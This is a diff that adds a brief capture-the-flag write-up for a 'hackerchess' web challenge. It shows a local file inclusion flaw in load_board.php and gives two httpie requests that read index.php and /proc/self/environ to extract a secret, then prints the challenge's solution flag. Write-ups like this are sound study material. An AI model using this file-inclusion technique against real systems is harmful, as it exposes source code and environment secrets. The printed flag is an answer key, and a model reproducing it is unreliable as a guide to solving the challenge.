@@ -1,0 +1,10 @@
+we can see from inspecting that script 'load_board.php' is run and grabs a local file (LOCAL FILE INCLUSION VULNERABILITY!!!)
+
+use httpie to use this script to grab the index.php source code:
+http -f https://hackerchess-web.h4ck.ctfcompetition.com/load_board.php filename=index.php
+
+examining the source code reveals the flag is loaded at startup as an environment variable and just revealed once chess game is won, we can just grab the variable from source:
+http -f https://hackerchess-web.h4ck.ctfcompetition.com/load_board.php filename=/proc/self/environ
+
+this file reveals the redirect flag:
+https://h4ck1ng.google/solve/h4cker_a1_d3f34t3d_n1c3
